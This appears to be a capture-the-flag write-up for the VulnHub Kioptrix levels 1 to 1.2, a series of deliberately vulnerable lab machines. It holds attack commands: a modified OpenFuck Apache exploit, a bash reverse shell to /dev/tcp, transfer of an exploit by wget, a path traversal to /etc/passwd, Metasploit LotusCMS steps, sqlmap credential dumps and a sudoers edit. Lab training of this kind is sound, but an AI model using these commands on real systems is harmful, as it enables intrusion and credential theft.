# kioptrix-full-walkthrough
It's a pretty much famous one to get started with and can be easily found in here: https://www.vulnhub.com/. In my opinion, this is a very well made box to have a good enough knowledge about penetration testing with learning most of the basic tools we'll need to operate in a daily basis. Hope I could match your understanding with the writeup! Here's to solving many more!

<h1>Kioptrix Level 1</h1>

Step 1: Downloading machine and setting up.

Step 2: Run netdiscover to learn the machine IP.

`sudo netdiscover -i eth0`

![image](https://user-images.githubusercontent.com/31168741/199799872-1a04ded4-b40c-4cae-b085-f970aee67bd2.png)

Note: Found out by the mac address.

Step 3: Run nmap scan on the machine IP that we found.

`sudo nmap -sS -A -p- [machine-ip] -T4`

![image](https://user-images.githubusercontent.com/31168741/199800031-894a8f69-a2f0-4585-8d1f-84a3fceba8c4.png)
![image](https://user-images.githubusercontent.com/31168741/199800056-715a15f8-f636-40f8-801f-0a477a7fef28.png)
nmap result as found above!

Step 4: Running some other tools to enumerate as much information as possible from the machine.

`enum4linux [machine-ip]`<br>
`dirsearch -u http://[machine-ip]`

Step 5: Now we browse for available exploits.

As shown in the output, the target system is using a very outdated Apache web server version 1.3.20. We Google for **“apache 1.3.20 vulnerability”**.<br>
Search for the exploit via searchsploit:

`searchsploit OpenFuck`

![image](https://user-images.githubusercontent.com/31168741/199801410-e466b70b-3dce-477a-8ceb-eea0ec90c4aa.png)

## Modify the exploit code:

Simply make a copy of the <b>764.c</b> exploit and put it somewhere to check it out and make changes to it (because the ‘off-the-shell’ code over there is pretty outdated)

`cp /usr/share/exploitdb/exploits/unix/remote/764.c OpenFuck.c`

Here, we need to make some modification to the code before compiling it. Can be done using any text editor such as nano or vim.

`vim OpenFuck.c`

Below are the list of changes which are needed to be made to the <b>OpenFuck.c</b> code,

**Include the openssl rc4 and md5 libraries:**

>#include <openssl/rc4.h><br>
>#include <openssl/md5.h>

Modify the <b>‘wget’</b> method in the exploit itself because the url does not exist anymore. we need to update it to become the new URL to download the file.
Search for <b>‘wget’</b> in the exploit, and then replace the URL to <b>http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</b>

**Install Libraries for compiling the modified exploit code:**

> apt-get install libssl-dev<br>
> gcc -o OpenFuck OpenFuck.c -lcrypto

Running the exploit,

`./OpenFuck 0x6b <i><b>[machine-ip]</b></i> 443 -c 40`

![image](https://user-images.githubusercontent.com/31168741/199802750-a1c211c4-c945-4549-bc19-98446b53831b.png)

It worked!

<h1>Kioptrix Level 1.1(2)</h1>

Step 1: Follow Step 1 & Step 2 from previous one as described to set the machine up and discovering machine IP.

Step 2: Run nmap scan on the machine IP that we found.

`sudo nmap -sS -A -p- [machine-ip] -T4`

![image](https://user-images.githubusercontent.com/31168741/199806144-1718d44e-5564-429a-8f5e-58d748009ca2.png)

Step 3: Let’s take a deeper dive by inspecting what lies in the open port i.e. ***[machine-ip]***:80

**N.B.** I reinstalled the machine, ts why the ip changed.

![image](https://user-images.githubusercontent.com/31168741/199806234-c60c90b3-8521-469f-99b3-da5d9e2a0486.png)

Whoa! A login form. From the nmap scan, we notice the web application is using unauthorized mysql. This is vulnerable to SQLi. It turns out the authentication can be bypassed by using the following payload in the username field:

![image](https://user-images.githubusercontent.com/31168741/199806285-5834b923-b39b-4cb1-b2cf-9411302889bf.png)

But we need a shell to operate more flexibly.

![image](https://user-images.githubusercontent.com/31168741/199806351-02b40ddb-6bdf-40a1-a4ee-c683b919f39d.png)
![image](https://user-images.githubusercontent.com/31168741/199806383-709bfcfa-928e-49b6-b1fc-032eacd73d21.png)

So, we setup a listener and using a BASH reverse shell to connect to the listener; putting the script below inside the console that we just took privilege:

`bash -i >& /dev/tcp/<i><b>[host-ip]</b></i>/1234 0>&1` (host machine)

![image](https://user-images.githubusercontent.com/31168741/199806457-c234670e-b98c-4e34-a371-d713d3d11328.png)

We are into the shell! We look around for more info.

![image](https://user-images.githubusercontent.com/31168741/199806517-f0a4fc1d-17db-4f9d-b62d-46e0f8d2f0a6.png)
![image](https://user-images.githubusercontent.com/31168741/199806565-fba7cafa-d421-4b98-9f6f-fffa2ffb736a.png)

Step 4: Looking out for available exploits regarding the version privilege escalation.

![image](https://user-images.githubusercontent.com/31168741/199806647-16bb2db6-10e1-43ec-8ed1-1d9c67b52842.png)

We find one and download the exploit.

![image](https://user-images.githubusercontent.com/31168741/199806720-0134067b-2762-48ca-b830-ee4d28153eb8.png)

Step 5: Running a python server in the host machine `python3 -m http.server 80` so that we can copy the exploit to the target machine.

![image](https://user-images.githubusercontent.com/31168741/199806805-4fb64c04-ee75-4a27-a721-e9ef97397e13.png)

Transferring the exploit to the target machine using the Python web server and wget: `wget [host-ip]/[exploit]` (must be in the location where the server is running)

![image](https://user-images.githubusercontent.com/31168741/199806868-7bcfbb84-a83c-41ad-9573-34c9027566ce.png)

It’s copied. (We are downloading basically!)

Step 6: Compiling the exploit using GCC, allocating execute permissions to it and executing it:

![image](https://user-images.githubusercontent.com/31168741/199806960-7773eaf1-1689-47b7-859b-95f29d6f672e.png)

Now we are in the root!

<h1>Kioptrix Level 1.2(3)</h1>

Step 1: Follow Step 1 & Step 2 from previous one as described to set the machine up and discovering machine IP.

Step 2: Before we move any further, we better add the domain/ip in ***/etc/hosts*** file in case, we can't reach the requested page.

![image](https://user-images.githubusercontent.com/31168741/199953402-8d1b9972-159e-4dac-8c3e-7e064a29f61f.png)
![image](https://user-images.githubusercontent.com/31168741/199953427-1d9eda09-61e0-40ed-8ce9-da02fd13b5c0.png)

Step 3: Run nmap scan on the machine IP that we found.

`sudo nmap -sS -A -p- [machine-ip] -T4`

![image](https://user-images.githubusercontent.com/31168741/199953516-281d5a6a-8555-4b3b-b94f-af3abcd363bd.png)

Step 4: Running some other tools to enumerate as much information as possible from the machine.

`dirsearch -u http://[machine-ip]`

![image](https://user-images.githubusercontent.com/31168741/199953683-e4ceae80-caa4-4c6a-abf8-0d96fd478bdf.png)

`nikto -h [machine-ip]`

![image](https://user-images.githubusercontent.com/31168741/199953794-9606b92d-cc20-418a-bcbb-48a46a144cdc.png)

Step 5: Just as before, let’s take a deeper dive by inspecting what lies in the open port i.e. ***[machine-ip]***:80

![image](https://user-images.githubusercontent.com/31168741/199954089-d3bd781b-5f7e-40d7-94aa-8b6c282e9511.png)

So, a home page!

![image](https://user-images.githubusercontent.com/31168741/199954135-1682ec5b-2cc0-40f9-a9b8-082947f98887.png)

Then, a login form. Interesting!

![image](https://user-images.githubusercontent.com/31168741/199954281-f0aa41bb-c4ff-4168-a6a0-cb6a3955fcf1.png)

We could always try the step above by simply adding ***../../../etc/passwd*** and ***%00pdf*** if something lies there, will show up! Seems the effort didn't go in vain at all.

Step 6: Exploitation

`searchsploit lotuscms`

![image](https://user-images.githubusercontent.com/31168741/199954445-0f392e2b-26e6-42ee-b86b-e0861af6de3e.png)

***Setting up the options:***

`msfconsole` <br>
`search lotuscms`<br>
`use exploit/multi/http/lcms_php_exec`<br>
`show options`<br>
`set RHOSTS [target-ip]`<br>
`set LHOST [host-ip]`<br>
`set PAYLOAD generic/shell_bind_tcp`<br>
`set URI /`<br>
`exploit`

![image](https://user-images.githubusercontent.com/31168741/199955556-e73a7f88-3608-4e8a-b6a2-c9b4d8b15bcf.png)

We are into the shell!

![image](https://user-images.githubusercontent.com/31168741/199955647-b1001ada-0fdf-4846-b31d-97b94aac37a8.png)

But, the file we need to get into asks for the root permit and we don't have one. This would’ve worked in the past but it seems it doesn’t work anymore since this is a very old machine. So, we got only one way to get through i.e. by SQLi.

Step 7: On another note, we find out, kioptrix3.com/gallery, let’s look into that! Showing this only because you can always find clues if you look a li'll hard. Although we found it through directory brute-force in Step 4.

![1](https://user-images.githubusercontent.com/31168741/199956198-94b4f909-fe87-4d1c-80b9-3e46039317f3.PNG)
![1](https://user-images.githubusercontent.com/31168741/199956287-5dbe1054-01a6-4e3d-926e-40ad9e16ba47.PNG)
![1](https://user-images.githubusercontent.com/31168741/199956549-19251424-d62e-4eb7-9a71-b154b4efb088.PNG)
![1](https://user-images.githubusercontent.com/31168741/199956655-de874a9a-4dd9-49b0-bfdc-db8a1883a3cd.PNG)

Although we could do the manual injection, I used sqlmap for a better understading and time saviour not to mention. Dumping tables from the database named **gallery**.

![image](https://user-images.githubusercontent.com/31168741/199956733-689a32cb-bc7c-4b10-873e-07d5cda81bf1.png)
![image](https://user-images.githubusercontent.com/31168741/199956759-1816ea99-f341-4ebc-ac08-3784c5a0ca9b.png)

Dumping account information reveals some userid with credentials.

![image](https://user-images.githubusercontent.com/31168741/199956826-b0d40c64-76a1-4613-9d9e-53a2558bf5a1.png)
![image](https://user-images.githubusercontent.com/31168741/199956839-8d3fcf3d-aca3-42f5-b80f-162f3137408f.png)

We try to find out **mysql** credentials as well.

![image](https://user-images.githubusercontent.com/31168741/199956901-ace08953-7d77-4f35-9c5d-92e2e31eecbb.png)
![image](https://user-images.githubusercontent.com/31168741/199956927-33a0d7e7-7f9f-46c4-a12f-37fb3542c5b3.png)
![image](https://user-images.githubusercontent.com/31168741/199956952-6ae6802a-b497-4445-a7d1-d2cbd3ea8949.png)

Seems we succeeded. The hash values can be decrypted by any online decoder or command tools such as *hashcat* or *john the ripper*.

![image](https://user-images.githubusercontent.com/31168741/199957016-c9891e60-21c0-4afe-a4ec-426ec47c3ff7.png)

Logging in phpmyadmin seems like:

![image](https://user-images.githubusercontent.com/31168741/199957067-28294548-1457-4a0e-8524-475bafc4c8a9.png)

Although we managed to get the userid and passwords by sqlmap previously, we could use this too.

![image](https://user-images.githubusercontent.com/31168741/199957102-30be9ce6-0911-4baa-a3ab-6201b76e420a.png)

Now logging into the machine through ssh, we find some error which later has been solved by using the command: ***-oHostKeyAlgorithms=+ssh-dss*** as shown below.

![image](https://user-images.githubusercontent.com/31168741/199957169-140446a0-1d68-445b-83c0-643697469c57.png)

We first log into the **dreg** user and see what permission we have as root by typing `sudo -l`.

![image](https://user-images.githubusercontent.com/31168741/199957184-2699b5a6-56d4-4010-898b-d97c8bf6b29e.png)

Oops none!

![image](https://user-images.githubusercontent.com/31168741/199957202-d3eba19e-7aef-4faa-b90e-5f0c0372af3b.png)

Switching to the other user, we read ***CompanyPolicy.README*** from the **/home/loneferret** directory and as per the instruction, issued the `sudo ht` command.

![image](https://user-images.githubusercontent.com/31168741/199957221-4569a06d-ba01-4be1-b54f-471fea659147.png)

Unfortunately, an error shows while opening the terminal with *xterm-256color*. Doing some research helped me determine that if the `export TERM=xterm` command was used, it would bypass the *xterm-256color* error.

![image](https://user-images.githubusercontent.com/31168741/199957234-862ae621-1a0c-467d-b60a-f5c9a3529716.png)

After that, re-issuing the `sudo ht` command launched it without any issue.

![image](https://user-images.githubusercontent.com/31168741/199957253-f9d08b6d-6660-489b-9ff7-4f5320d6181c.png)

The *ht editor* opens within the terminal window. At this point, we should be able to open any file with root permissions.

![image](https://user-images.githubusercontent.com/31168741/199957272-9fcd6fb1-2055-48ba-9add-457f5abcb743.png)

Using the function keys to navigate, I opened **(F3 to open)** the */etc/sudoers* file that allowed me to add root privileged commands for the **loneferret** account.

![image](https://user-images.githubusercontent.com/31168741/199957285-e0b220bf-f440-4c2c-a103-5a63d33b0c8a.png)

With the ***/etc/sudoers*** file open, the **loneferret** account already had a line item with root privileges to two commands that did not require a password entry. In order to obtain root privileges for the **loneferret** account, we add `/bin/sh` directly after `/usr/local/bin/ht`. This provided root access to the **sh** shell. Next we save the file and quit.

## Capturing the Flag:
Within the terminal, issuing the `sudo /bin/sh` command, the prompt changes to a **'#'** sign which already indicates we're in root. But to be sure let's type in `id` and `whoami` accordingly to validate root access. Once obtaining root access, it was a matter of changing to the `/root` directory and performing a list.

![image](https://user-images.githubusercontent.com/31168741/199957301-1b0a4590-2c86-43d4-8194-ec8e6feeed40.png)

Read the contents of **Congrats.txt**.

![image](https://user-images.githubusercontent.com/31168741/199996040-448c8413-2410-4515-aea9-32662197e472.png)

We solved yay!
